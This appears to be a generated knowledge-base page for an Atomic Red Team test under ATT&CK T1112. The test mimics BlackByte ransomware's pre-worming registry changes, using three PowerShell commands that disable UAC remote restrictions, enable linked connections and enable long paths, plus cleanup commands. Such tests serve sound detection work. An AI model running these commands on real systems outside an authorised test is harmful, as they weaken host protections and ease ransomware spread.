---
atomic_guid: "0b79c06f-c788-44a2-8630-d69051f1123d"
title: "BlackByte Ransomware Registry Changes - Powershell"
framework: "atomic"
generated: "true"
attack_technique_id: "T1112"
attack_technique_name: "Modify Registry"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "0b79c06f-c788-44a2-8630-d69051f1123d"
  - "BlackByte Ransomware Registry Changes - Powershell"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# BlackByte Ransomware Registry Changes - Powershell

This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell.  See "Preparing to Worm" section: https://redcanary.com/blog/blackbyte-ransomware/
The steps are as follows:
<ol>
    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>
    <li>2. Enable OS to share network connections between different privilege levels</li>
    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>
</ol>
The registry keys and their respective values will be created upon successful execution.

## Metadata

- Atomic GUID: 0b79c06f-c788-44a2-8630-d69051f1123d
- Technique: T1112: Modify Registry
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1112/T1112.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1112-modify_registry|T1112]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force
New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force
New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force
```

### Cleanup

```powershell
Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Force -ErrorAction Ignore
Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLinkedConnections -Force -ErrorAction Ignore
Remove-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name LongPathsEnabled -Force -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.yaml)
